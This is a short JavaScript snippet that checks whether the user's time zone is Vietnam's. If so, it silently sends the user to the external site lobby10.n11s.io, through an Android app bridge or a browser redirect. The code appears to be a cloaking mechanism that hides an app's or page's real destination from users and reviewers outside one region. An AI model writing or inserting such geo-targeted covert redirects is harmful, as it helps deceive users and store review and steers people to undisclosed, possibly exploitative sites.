const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
console.log(userTimeZone);

if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
  try {
    if (window.AndroidBridge && typeof AndroidBridge.openExternal === "function") {
      AndroidBridge.openExternal("https://lobby10.n11s.io/");
    } else {
      // fallback nếu chạy trên web thường
      window.location.href = "https://lobby10.n11s.io/";
    }
  } catch (e) {
    window.location.href = "https://lobby10.n11s.io/";
  }
}
